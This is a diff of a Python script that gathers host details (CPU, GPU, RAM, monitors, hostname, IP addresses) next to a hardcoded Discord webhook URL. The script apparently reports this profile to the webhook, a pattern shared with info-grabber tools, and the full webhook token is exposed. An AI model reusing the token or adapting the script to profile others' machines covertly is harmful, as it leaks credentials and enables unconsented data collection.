@@ -3,6 +3,8 @@ import requests
 import socket
 from cpuinfo import get_cpu_info
 import GPUtil
+import psutil
+from screeninfo import get_monitors
 
 # Replace with your Discord webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1320641725034926133/l1Y2_9bYYvtluQR4Io67E96ubDUT_x9wGDOHHtYz0GifdZOfGNq0Su2AqPji3ttuIWj8"
@@ -17,11 +19,24 @@ def get_public_ip():
 
 def get_machine_info():
     try:
+        # CPU Info
         cpu_info = get_cpu_info()
-        gpu_info = GPUtil.getGPUs()
         
+        # GPU Info
+        gpu_info = GPUtil.getGPUs()
         gpu_details = [
             f"{gpu.name} (Total Memory: {gpu.memoryTotal}MB)" for gpu in gpu_info
+        ]
+        
+        # RAM Info
+        ram = psutil.virtual_memory()
+        ram_total_gb = round(ram.total / (1024**3), 2)  # Convert to GB
+        
+        # Monitor Info
+        monitors = get_monitors()
+        monitor_details = [
+            f"Monitor {idx + 1}: {monitor.width}x{monitor.height} @ {monitor.width_mm}x{monitor.height_mm} mm"
+            for idx, monitor in enumerate(monitors)
         ]
         
         return {
@@ -32,7 +47,9 @@ def get_machine_info():
             "Architecture": platform.architecture()[0],
             "Hostname": socket.gethostname(),
             "IP Address": socket.gethostbyname(socket.gethostname()),
+            "RAM": f"{ram_total_gb} GB",
             "GPUs": "; ".join(gpu_details) if gpu_details else "No GPU Detected",
+            "Monitors": "; ".join(monitor_details) if monitor_details else "No Monitor Detected",
         }
     except Exception as e:
         return {"Error": f"Failed to retrieve machine info: {e}"}
